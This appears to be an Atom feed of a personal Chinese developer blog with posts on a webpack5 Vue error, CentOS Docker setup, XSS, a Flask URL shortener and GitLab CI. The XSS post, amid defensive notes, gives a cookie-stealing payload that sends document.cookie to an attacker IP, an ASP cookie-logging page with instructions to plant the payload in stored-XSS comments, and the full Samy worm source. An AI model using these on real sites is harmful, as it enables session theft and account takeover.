<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HarryPangPangBlog</title>
  
  
  <link href="https://harrypangpang.github.io/atom.xml" rel="self"/>
  
  <link href="https://harrypangpang.github.io/"/>
  <updated>2023-03-06T10:29:07.481Z</updated>
  <id>https://harrypangpang.github.io/</id>
  
  <author>
    <name>HarryPangPang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>webpack5内vue递归组件报错.md</title>
    <link href="https://harrypangpang.github.io/2023/03/06/webpack5%E5%86%85vue%E9%80%92%E5%BD%92%E7%BB%84%E4%BB%B6%E6%8A%A5%E9%94%99-md/"/>
    <id>https://harrypangpang.github.io/2023/03/06/webpack5%E5%86%85vue%E9%80%92%E5%BD%92%E7%BB%84%E4%BB%B6%E6%8A%A5%E9%94%99-md/</id>
    <published>2023-03-06T10:23:13.000Z</published>
    <updated>2023-03-06T10:29:07.481Z</updated>
    
    <content type="html"><![CDATA[<p>今天在一个webpack4升级到webpack5后的项目中，遇到了一个问题：<br />页面打开后，提示如下报错：</p><pre><code class="hljs plaintext">ReferenceError: Cannot access &#x27;__WEBPACK_DEFAULT_EXPORT__&#x27; before initializationat Module.default (155747:3:42)at eval (index.vue?d775:50:1)</code></pre><p>第一反应就是是不是webpack5哪里打包错误导致引用错误，然后进到项目文件里发现了一个递归组件</p><pre><code class="hljs plaintext">import MenuTree from &#x27;@/views/help-center/components/menu-tree&#x27;;export default &#123;    name: &#x27;MenuTree&#x27;,    components: &#123;        MenuTree    &#125;,...    &#125;</code></pre><p>结合报错信息，盲猜是打包的时候导入自身，而自身又没有引入引起的，于是将组件引入方法改成了动态引入</p><pre><code class="hljs plaintext">export default &#123;    name: &#x27;MenuTree&#x27;,    components: &#123;        MenuTree: ()=&gt; import(&quot;./index.vue&quot;),    &#125;,...    &#125;</code></pre><p>再打开页面，就发现正常工作了，详细原因日后补充，反正修好了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天在一个webpack4升级到webpack5后的项目中，遇到了一个问题：&lt;br /&gt;
页面打开后，提示如下报错：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs plaintext&quot;&gt;ReferenceError: Cannot access &amp;#x27;__WE</summary>
      
    
    
    
    
    <category term="前端" scheme="https://harrypangpang.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>centos安装node和docker</title>
    <link href="https://harrypangpang.github.io/2023/02/23/centos%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83(docker)/"/>
    <id>https://harrypangpang.github.io/2023/02/23/centos%E5%AE%89%E8%A3%85node%E7%8E%AF%E5%A2%83(docker)/</id>
    <published>2023-02-23T03:15:00.000Z</published>
    <updated>2023-02-23T03:30:13.096Z</updated>
    
    <content type="html"><![CDATA[<h3 id="node"><a class="markdownIt-Anchor" href="#node"></a> Node</h3><pre><code class="hljs plaintext">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bashnvm install nodeyum updateyum install -y git</code></pre><h3 id="docker"><a class="markdownIt-Anchor" href="#docker"></a> Docker</h3><pre><code class="hljs plaintext"> sudo yum remove docker \                  docker-client \                  docker-client-latest \                  docker-common \                  docker-latest \                  docker-latest-logrotate \                  docker-logrotate \                  docker-engine2. sudo yum install -y yum-utils3. sudo yum-config-manager \    --add-repo \    https://download.docker.com/linux/centos/docker-ce.repo    4. sudo yum install docker-ce docker-ce-cli containerd.io5. sudo systemctl start docker6.sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.27.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose7. sudo chmod +x /usr/local/bin/docker-compose8. sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose## 报错就：yum install -y https://download.docker.com/linux/centos/7/x86_64/stable/Packages/containerd.io-1.2.6-3.3.el7.x86_64.rpm</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;node&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#node&quot;&gt;&lt;/a&gt; Node&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;hljs plaintext&quot;&gt;curl -o- https://raw.githubusercont</summary>
      
    
    
    
    
    <category term="后端" scheme="https://harrypangpang.github.io/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>xss攻击</title>
    <link href="https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/"/>
    <id>https://harrypangpang.github.io/2023/02/21/xss%E6%94%BB%E5%87%BB/</id>
    <published>2023-02-21T02:41:21.000Z</published>
    <updated>2023-03-06T10:34:19.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-introduce"><a class="markdownIt-Anchor" href="#xss-introduce"></a> xss-introduce</h1><h1 id="xss-introduce-2"><a class="markdownIt-Anchor" href="#xss-introduce-2"></a> xss introduce</h1><h3 id="理解xss的攻击手段和原理"><a class="markdownIt-Anchor" href="#理解xss的攻击手段和原理"></a> 理解XSS的攻击手段和原理</h3><h2 id="掌握xss攻击的防范措施"><a class="markdownIt-Anchor" href="#掌握xss攻击的防范措施"></a> 掌握xss攻击的防范措施</h2><p>了解XSS的定义<br />跨站脚本漏洞将允许攻击者在一个网站中执行恶意脚本，OWASP给出的XSS漏洞定义如下：<br />“一名攻击者可以利用XSS漏洞向不知情的用户发送恶意脚本。终端用户的浏览器无法确定这些脚本是否可信任，并且会自动运行这些恶意脚本。因为它会认为这个脚本来自一个可信任的源，而恶意脚本将访问浏览器中保存的cookie、会话token或其他的敏感信息，并利用这些信息来完成其他的恶意目的，而有些脚本甚至还可以修改页面的HTML代码。”</p><h3 id="理解xss的原理必备"><a class="markdownIt-Anchor" href="#理解xss的原理必备"></a> 理解xss的原理（必备）</h3><p>理解xss的攻击方式<br />掌握xss的防御措施</p><h4 id="理解xss攻击方式"><a class="markdownIt-Anchor" href="#理解xss攻击方式"></a> 理解XSS攻击方式：</h4><p>反射型：发出请求时，XSS代码出现在URL中（典型的特征，攻击脚本写在URL中，是明文的），作为输入提交到服务器端，服务器端解析后响应（），XSS代码随响应内容一起传回给浏览器（解析了XS代码，服务端把内容与HTML文本下发给浏览器，通常是js脚本），最后浏览器解析执行XSS代码这个过程想一次反射，故叫反射型XSS<br />演示：构建Node应用，演示反射型XSS攻击</p><p>存储型：差别在于提交的代码会存储在服务器端（数据库，内存，服务系统等）下次请求页面时不用再提交XSS代码。<br />1)反射型XSS: 就如上面的例子，也就是黑客需要诱使用户点击链接。也叫作&quot;非持久型XSS“(Non-persistent XSS)<br />2)存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。<br />比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做&quot;存储型XSS&quot;。<br />3)DOM based XSS:也是一种反射型XSS，由于历史原因被单独列出来了。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。<br />XSS脚本怎么进入服务端？</p><h4 id="xss防御措施"><a class="markdownIt-Anchor" href="#xss防御措施"></a> XSS防御措施：</h4><p>编码：不能对用户所有输入保持原样<br />对用户输入的数据进行HTML Entity编码</p><p>过滤：把输入不合法的过滤掉，保持安全性<br />移除用户上传的DOM属性，如onerror，onclick等<br />移除用户上传的Style节点，script节点，iframe节点等<br />对于开发人员来说，首先需要注意的是应该对所有用户提交的内容执行坚如磐石输入验证。这包括网址，查 询字符串，header，POST 数据等所有用户提交的内容。只接受您所希望的字符，在您指定的长度内，和指定 的相应的数据的格式。组织，过滤，或忽略一切。 2. 保护被自动执行或来自第三方网站执行的所有敏感功能。在适当的情况使用会话令牌 27、验证码 28系统或者 HTTP 引用头检查。 3. 如果您的网站必须支持用户提供的 HTML，那么你是处在一个安全明智的下滑坡。然而，也有一些事情可以 做，来保护您的网站。请确保您收到的 HTML 内容是良好的，只包含最少的一组安全标签（绝对没有 JavaScript）， 没有包含任何引用远程的内容（尤其是样式表和 JavaScript）。而且，为了多一点的安全性，请将 httpOnly29添 加到您的 cookie</p><p>校正：破坏了正常的页面结构，也是一种XSS攻击<br />避免直接都HTML Entity解码<br />使用DOM Parse（文本转成DOM结构）转换，校正不配对的DOM标签</p><p>掌握XSS的防御措施<br />实战：<br />构建Node服务和建立一个评论，实例演示XSS的攻击预防</p><p>Xss攻击常见测试语句</p><pre><code class="hljs plaintext">&lt;scrtpt&gt;alert(‘test’)&lt;/script&gt;&lt;svg onload=alert(‘test’)&gt;http://www.ocelltech.com/en/so.aspsearch：inurl:&#x27;Product.asp?BigClassName&#x27;//google中华网*/&gt;&lt;script&gt;alert(1)&lt;/script&gt;把alert里面的内容换成document.cookie就可以*/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;一般的做法是&lt;html&gt;&lt;title&gt;xx&lt;/title&gt;&lt;body&gt;&lt;%testfile = Server.MapPath(&quot;code.txt&quot;) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中msg = Request(&quot;msg&quot;)   //获取提交过来的msg变量，也就是cookie值set fs = server.CreateObject(&quot;scripting.filesystemobject&quot;)//创建一个fs对象set thisfile = fs.OpenTextFile(testfile,8,True,0)thisfile.WriteLine(&quot;&quot;&amp;msg&amp;&quot;&quot;)//像code.txt中写入获取来的cookiethisfile.close()   //关闭set fs = nothing%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>把上述文件保存为cookie.asp文件，放到你自己的网站服务器下。比如这里我们自己搭建的服务器为：<a href="http://10.65.20.196:8080">http://10.65.20.196:8080</a>。<br />XSS构造语句</p><pre><code class="hljs plaintext">&lt;script&gt;window.open(&#x27;http://10.65.20.196:8080/cookie.asp?msg=&#x27;+document.cookie)&lt;/script&gt;</code></pre><p>把上述语句放到你找到的存在XSS的目标中，不过这里最好是存储型xss，比如你找到了某个博客或者论坛什么的存在存储型XSS，你在里面发一篇帖子或者留上你的评论，内容就是上述语句，当其他用户或者管理员打开这个评论或者帖子链接后，就会触发，然后跳转到<a href="http://10.65.20.196:8080/cookie.asp?msg=%E2%80%99+document.cookie%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BD%93%E5%89%8D%E8%B4%A6%E6%88%B7%E7%9A%84coolie%E4%BF%A1%E6%81%AF%E5%B0%B1%E5%BD%93%E6%88%90%E5%8F%82%E6%95%B0%E5%8F%91%E5%88%B0%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E9%87%8C%E4%BA%86%E3%80%82%E7%84%B6%E5%90%8E%E7%9A%84%E7%84%B6%E5%90%8E%E4%BD%A0%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%82%A3%E8%BF%99%E4%B8%AAcookie%E7%99%BB%E9%99%86%E4%BA%86">http://10.65.20.196:8080/cookie.asp?msg=’+document.cookie的页面，然后当前账户的coolie信息就当成参数发到你的网站下的文件里了。然后的然后你就可以那这个cookie登陆了</a></p><p>Samy蠕虫源码</p><pre><code class="hljs plaintext">1.&lt;div id=mycode style=&quot;BACKGROUND:url(&#x27;java  2.script:eval(document.all.mycode.expr)&#x27;)&quot;expr=&quot;var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return 3.C&#125;else&#123;return eval(&#x27;document.body.inne&#x27;+&#x27;rHTML&#x27;)&#125;&#125;function 4.getData(AU)&#123;M=getFromURL(AU,&#x27;friendID&#x27;);L=getFromURL(AU,&#x27;Mytoken&#x27;)&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split(&#x27;&amp;&#x27;);var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split(&#x27;=&#x27;);AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS[&#x27;Mytoken&#x27;];varM=AS[&#x27;friendID&#x27;];if(location.hostname==&#x27;profile.myspace.com&#x27;)&#123;document.location=&#x27;http://www.myspace.com&#x27;+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),&#x27;up_launchIC( &#x27;+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new 5.String();var O=0;for(var P 6.in AV)&#123;if(O&gt;0)&#123;N+=&#x27;&amp;&#x27;&#125;varQ=escape(AV[P]);while(Q.indexOf(&#x27;+&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;+&#x27;,&#x27;%2B&#x27;)&#125;while(Q.indexOf(&#x27;&amp;&#x27;)!=-1)&#123;QQ=Q.replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;)&#125;N+=P+&#x27;=&#x27;+Q;O++&#125;return 7.N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return 8.false&#125;eval(&#x27;J.onr&#x27;+&#x27;eadystatechange=BI&#x27;);J.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;J.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);J.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;J.send(BK);return 9.true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,&#x27;name=&#x27;+B+BG+B+&#x27; value=&#x27;+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG==&#x27;Mytoken&#x27;)&#123;T=B&#125;else&#123;T=&#x27;&amp;&#x27;&#125;var U=BG+&#x27;=&#x27;;varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else 10.if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject(&#x27;Msxml2.XMLHTTP&#x27;)&#125;catch(e)&#123;try&#123;Z=newActiveXObject(&#x27;Microsoft.XMLHTTP&#x27;)&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return 11.Z&#125;var AA=g();var AB=AA.indexOf(&#x27;m&#x27;+&#x27;ycode&#x27;);var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf(&#x27;D&#x27;+&#x27;IV&#x27;);var AE=AC.substring(0,AD);varAF;if(AE)&#123;AEAE=AE.replace(&#x27;jav&#x27;+&#x27;a&#x27;,A+&#x27;jav&#x27;+&#x27;a&#x27;);AEAE=AE.replace(&#x27;exp&#x27;+&#x27;r)&#x27;,&#x27;exp&#x27;+&#x27;r)&#x27;+A);AF=&#x27; 12.but most of all, samy is my hero. &lt;d&#x27;+&#x27;iv id=&#x27;+AE+&#x27;D&#x27;+&#x27;IV&gt;&#x27;&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,&#x27;P&#x27;+&#x27;rofileHeroes&#x27;,&#x27;&lt;/td&gt;&#x27;);AGAG=AG.substring(61,AG.length);if(AG.indexOf(&#x27;samy&#x27;)==-1)&#123;if(AF)&#123;AG+=AF;var 13.AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 14.AS=new 15.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Preview&#x27;;AS[&#x27;interest&#x27;]=AG;J=getXMLObj();httpSend(&#x27;/index.cfm?fuseaction=profile.previewInterests&amp;MytokenMytoken=&#x27;+AR,postHero,&#x27;POST&#x27;,paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 16.AS=new 17.Array();AS[&#x27;interestLabel&#x27;]=&#x27;heroes&#x27;;AS[&#x27;submit&#x27;]=&#x27;Submit&#x27;;AS[&#x27;interest&#x27;]=AG;AS[&#x27;hash&#x27;]=getHiddenParameter(AU,&#x27;hash&#x27;);httpSend(&#x27;/index.cfm?fuseaction=profile.processInterests&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 18.main()&#123;var AN=getClientFID();varBH=&#x27;/index.cfm?fuseaction=user.viewProfile&amp;friendID=&#x27;+AN+&#x27;&amp;Mytoken=&#x27;+L;J=getXMLObj();httpSend(BH,getHome,&#x27;GET&#x27;);xmlhttp2=getXMLObj();httpSend2(&#x27;/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;MytokenMytoken=&#x27;+L,processxForm,&#x27;GET&#x27;)&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,&#x27;hashcode&#x27;);var AR=getFromURL(AU,&#x27;Mytoken&#x27;);var 19.AS=new 20.Array();AS[&#x27;hashcode&#x27;]=AQ;AS[&#x27;friendID&#x27;]=&#x27;11851658&#x27;;AS[&#x27;submit&#x27;]=&#x27;Add to 21.Friends&#x27;;httpSend2(&#x27;/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken=&#x27;+AR,nothing,&#x27;POST&#x27;,paramsToString(AS))&#125;function 22.httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return 23.false&#125;eval(&#x27;xmlhttp2.onr&#x27;+&#x27;eadystatechange=BI&#x27;);xmlhttp2.open(BJ,BH,true);if(BJ==&#x27;POST&#x27;)&#123;xmlhttp2.setRequestHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);xmlhttp2.setRequestHeader(&#x27;Content-Length&#x27;,BK.length)&#125;xmlhttp2.send(BK);return 24.true&#125;&quot;&gt;&lt;/DIV&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-introduce&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss-introduce&quot;&gt;&lt;/a&gt; xss-introduce&lt;/h1&gt;
&lt;h1 id=&quot;xss-introduce-2&quot;&gt;&lt;a class=&quot;markdow</summary>
      
    
    
    
    
    <category term="安全" scheme="https://harrypangpang.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>短链接实现原理</title>
    <link href="https://harrypangpang.github.io/2023/02/20/%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>https://harrypangpang.github.io/2023/02/20/%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</id>
    <published>2023-02-20T03:41:21.000Z</published>
    <updated>2023-02-23T03:30:13.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用背景"><a class="markdownIt-Anchor" href="#使用背景"></a> 使用背景</h2><p>短链接顾名思义，就是将长链接转义成短链接。主要使用场景如下：</p><ul><li>短信发送长度限制</li><li>长链接生成的二维码过于密集，无法使用扫码功能</li><li>社交媒体的字符限制</li></ul><h2 id="大体流程"><a class="markdownIt-Anchor" href="#大体流程"></a> 大体流程</h2><ol><li>用户访问短链接</li><li>服务器查找短链接的key，在数据库/缓存中找到对应长链接参数</li><li>替换参数并重定向</li><li>用户成功访问到长链接网页内容</li></ol><h2 id="python代码示例flask"><a class="markdownIt-Anchor" href="#python代码示例flask"></a> python代码示例(flask)</h2><h3 id="生成"><a class="markdownIt-Anchor" href="#生成"></a> 生成：</h3><pre><code class="hljs plaintext">def getLink(shortKey):    redisKey = &quot;short_link:&quot;+shortKey    url = r.get(redisKey)    if not url:        return None    return urldef save(shortKey, url):    redisKey = &quot;short_link:&quot;+shortKey    url = r.set(redisKey, url, 3600*24)    returndef shortLink():    requestUrl = request.url    requestUrl = requestUrl.replace(&quot;http://&quot;, &quot;https://&quot;)    # xx(路由地址)    url = requestUrl.replace(&quot;/shortLink?&quot;, &quot;/xxx?&quot;)    # 将地址参数进行md5转化    hash_md5 = hashlib.md5()    hash_md5.update(url.encode(&#x27;utf-8&#x27;))    shortKey = hash_md5.hexdigest()    # 获取地址    arrUrl = requestUrl.split(&quot;/shortLink?&quot;)    urlHost = arrUrl[0]    shortUrl = urlHost + &quot;/to?short_key=&quot; + shortKey    # 获得短链地址并存储    savedUrl = getLink(shortKey)    if not savedUrl:        save(shortKey, url)    return shortUrl</code></pre><h3 id="访问"><a class="markdownIt-Anchor" href="#访问"></a> 访问：</h3><pre><code class="hljs plaintext">def to():    shortKey = request.args.get(&quot;short_key&quot;)    if not shortKey:        return (&#x27;short key not found&#x27;, 404)    url = getLink(shortKey)    if not url:        return (&#x27;full url not found&#x27;, 404)    return redirect(url)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#使用背景&quot;&gt;&lt;/a&gt; 使用背景&lt;/h2&gt;
&lt;p&gt;短链接顾名思义，就是将长链接转义成短链接。主要使用场景如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;短信发送长度限制&lt;/li&gt;
&lt;li&gt;长链接生</summary>
      
    
    
    
    
    <category term="后端" scheme="https://harrypangpang.github.io/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Gitlab ci/cd</title>
    <link href="https://harrypangpang.github.io/2022/02/17/Gitlab%20cicd/"/>
    <id>https://harrypangpang.github.io/2022/02/17/Gitlab%20cicd/</id>
    <published>2022-02-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.095Z</updated>
    
    <content type="html"><![CDATA[<h4 id="gitlab-cicd"><a class="markdownIt-Anchor" href="#gitlab-cicd"></a> Gitlab ci/cd</h4><ol><li><p>持续集成 开发-测试-集成测试</p></li><li><p>持续交付</p></li><li><p>持续部署</p></li><li><pre class="highlight"><code class="shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">事先安装好docker，下载地址：https://docs.docker.com/</span><span class="hljs-meta prompt_">#</span><span class="language-bash">拉取gitlab-runner镜像</span>docker pull gitlab/gitlab-runner<pre><code class="hljs plaintext">2. ```shell   #在shell里运行下面的命令，注意一下volume映射   #-v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \这一行的#\这一行的 $HOME/gitlab-runner-volume/config $HOME可以改成任意本地目录，之后会用到   # -v /var/run/docker.sock:/var/run/docker.sock \ 这一行的/var/run/docker.sock在win下可能有问题，需要找一下docker的安装位置   docker run -d \     --name gitlab-runner \     --restart always \     -v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \     -v /var/run/docker.sock:/var/run/docker.sock \     gitlab/gitlab-runner:latest</code></pre></code></pre></li><li><pre class="highlight"><code class="shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">如果需要更新镜像，可以走这一步，否则跳过即可</span>docker pull gitlab/gitlab-runner:latestdocker stop gitlab-runner &amp;&amp; docker rm gitlab-runnerdocker run -d \  --name gitlab-runner \  --restart always \  -v $HOME/gitlab-runner-volume/config:/etc/gitlab-runner \  -v /var/run/docker.sock:/var/run/docker.sock \  gitlab/gitlab-runner:latest<pre><code class="hljs plaintext">4. ```shell   # 注册gitlab-runner 参考https://docs.gitlab.com/runner/register/   docker run --rm -t -i -v $HOME/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register</code></pre></code></pre></li><li><p>这时候打开你的gitlab</p><p><img src="/Users/qiang.zhang/Desktop/%E6%88%AA%E5%B1%8F2020-04-08%E4%B8%8B%E5%8D%884.20.04.png" alt="截屏2020-04-08下午4.20.04" /></p><p><img src="/Users/qiang.zhang/Desktop/%E6%88%AA%E5%B1%8F2020-04-08%E4%B8%8B%E5%8D%884.22.27.png" alt="截屏2020-04-08下午4.22.27" /></p><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">上一步之后，会有一堆问题回答</span>Runtime platform                                    arch=amd64 os=linux pid=7 revision=4c96e5ad version=12.9.0Running in system-mode.                                                                               Please enter the gitlab-ci coordinator URL (e.g. https://gitlab.com/):<span class="hljs-meta prompt_">#</span><span class="language-bash">上图3的网址</span>Please enter the gitlab-ci token for this runner:<span class="hljs-meta prompt_">#</span><span class="language-bash">上图4的地址</span>Please enter the gitlab-ci description for this runner:[3a594927a932]: vue typescript templatePlease enter the gitlab-ci tags for this runner (comma separated):<span class="hljs-meta prompt_">#</span><span class="language-bash">自己定义的标签，比如<span class="hljs-built_in">test</span>,dev</span>Registering runner... succeeded                     runner=aPsdGq2APlease enter the executor: docker-ssh, parallels, ssh, virtualbox, custom, docker, shell, docker+machine, docker-ssh+machine, kubernetes:<span class="hljs-meta prompt_">#</span><span class="language-bash">写 docker</span>Please enter the default Docker image (e.g. ruby:2.6):<span class="hljs-meta prompt_">#</span><span class="language-bash">写 alpine:latest</span>Runner registered successfully. Feel free to start it, but if it&#x27;s running already the config should be automatically reloaded!</code></pre><p>回到你的gitlab，你就能看到下面的东西</p><p><img src="/Users/qiang.zhang/Desktop/%E6%88%AA%E5%B1%8F2020-04-08%E4%B8%8B%E5%8D%884.25.06.png" alt="截屏2020-04-08下午4.25.06" /></p></li><li><pre class="highlight"><code class="shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">运行下面的命令查看是否有问题</span>docker logs gitlab-runner<pre><code class="hljs plaintext">如果看到下面的错误，就证明docker没有生成config.toml，需要手动从之前定义的$HOME下找到config.toml复制到docker里</code></pre>ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0<span class="hljs-meta prompt_">#</span><span class="language-bash">或者下面的</span>ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0ERROR: Failed to load config stat /etc/gitlab-runner/config.toml: no such file or directory  builds=0<pre><code class="hljs plaintext">解决步骤：</code></pre>docker ps -a<span class="hljs-meta prompt_">#</span><span class="language-bash">看到类似下面这样的，复制CONTAINER ID</span><span class="hljs-meta prompt_">#</span><span class="language-bash">CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                      PORTS                      NAMES</span>c324fdf55c20        bfb85bb1e211                  &quot;gitlab-runner-helpe…&quot;   24 minutes ago      Exited (0) 24 minutes ago                              runner<span class="hljs-meta prompt_">#</span><span class="language-bash">接着下面的走</span>docker exec -it 刚才复制的containerid /bin/shcd /etc/gitlab-runnertouch config.tomlvi config.toml然后就是把本地的config.toml贴进去进行<pre><code class="hljs plaintext">7. 再执行</code></pre><span class="hljs-meta prompt_">#</span><span class="language-bash">Configuration loaded                                builds=0</span>Configuration loaded                                builds=0Checking for jobs... received                       job=872 repo_url=https://gitlab.jingle.cn/websh/ff_event_vue_template.git runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7Job succeeded                                       duration=27.6497334s job=872 project=42 runner=ejiRy6v7WARNING: Failed to parse &quot;X-GitLab-Trace-Update-Interval&quot; header  error=strconv.Atoi: parsing &quot;&quot;: invalid syntax header-value= job=872 runner=ejiRy6v7<pre><code class="hljs plaintext">   8. 然后我们在项目的根目录创建一个.gitlab-ci.yml</code></pre>test_job_1:    tags:        - dev    script:        - echo Hello world<pre><code class="hljs plaintext">   9. 再push上去的时候就能看到成功了![截屏2020-04-08下午4.47.27](/Users/qiang.zhang/Desktop/截屏2020-04-08下午4.47.27.png)附：</code></pre></code></pre></li></ol><p>image: node:latest<br />cache:<br />paths:<br />- node_modules/<br />before_script:<br />- node -v<br />- npm -v<br />- npm install<br />stages:</p><ul><li>development<br />test_job_1:<br />tags:<br />- dev<br />stage: development<br />script:<br />- npm run tpl<br />- npm run build</li></ul><pre class="highlight"><code class=""></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;gitlab-cicd&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#gitlab-cicd&quot;&gt;&lt;/a&gt; Gitlab ci/cd&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;持续集成 开发-测试-集成测试&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
